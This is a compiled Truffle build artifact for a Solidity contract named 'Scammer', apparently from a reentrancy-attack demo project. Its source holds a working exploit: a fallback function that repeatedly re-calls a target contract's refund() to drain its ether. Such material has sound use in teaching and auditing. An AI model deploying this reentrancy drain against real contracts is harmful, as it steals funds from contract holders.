{
  "contractName": "Scammer",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "count",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "investitions",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "invested",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "attack",
          "type": "address"
        }
      ],
      "name": "Attack",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50610411806100206000396000f300608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306661abd14610142578063a5b9b3fc1461016d578063bc346c9c146101c4578063cafb2202146101fa575b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631341015610140576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663590e1ae36040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561012757600080fd5b505af115801561013b573d6000803e3d6000fd5b505050505b005b34801561014e57600080fd5b50610157610225565b6040518082815260200191505060405180910390f35b34801561017957600080fd5b5061018261022b565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101f8600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610250565b005b34801561020657600080fd5b5061020f6103df565b6040518082815260200191505060405180910390f35b60015481565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000600181905550346002819055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663cbedbf5a6002546040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b15801561032657600080fd5b505af115801561033a573d6000803e3d6000fd5b50505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663590e1ae36040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156103c457600080fd5b505af11580156103d8573d6000803e3d6000fd5b5050505050565b600254815600a165627a7a7230582028ed00388affc4a27824d9da16bc0eeee4c4923af8277d6f57516b5928547ba30029",
  "source": "pragma solidity ^0.4.23;\r\n\r\nimport \"./Investitions.sol\";\r\n\r\ncontract Scammer {\r\n    Investitions public investitions;\r\n    uint256 public count;\r\n    uint256 public invested;\r\n\r\n    function Attack(address attack) payable public {\r\n        investitions = Investitions(attack);\r\n        count = 0;\r\n        invested = msg.value;\r\n        investitions.sendMoney.value(invested)();\r\n        investitions.refund();\r\n    }\r\n\r\n    function () payable public {\r\n       // count++;\r\n        if (msg.value < address(investitions).balance){\r\n            investitions.refund();\r\n        }\r\n    }\r\n}",
  "sourcePath": "C:\\Users\\1\\Desktop\\Re-EntrancyAttack\\contracts\\Scammer.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.24+commit.e67f0147.Emscripten.clang"
  },
  "schemaVersion": "2.0.1",
  "updatedAt": "2018-07-22T00:12:05.747Z"
}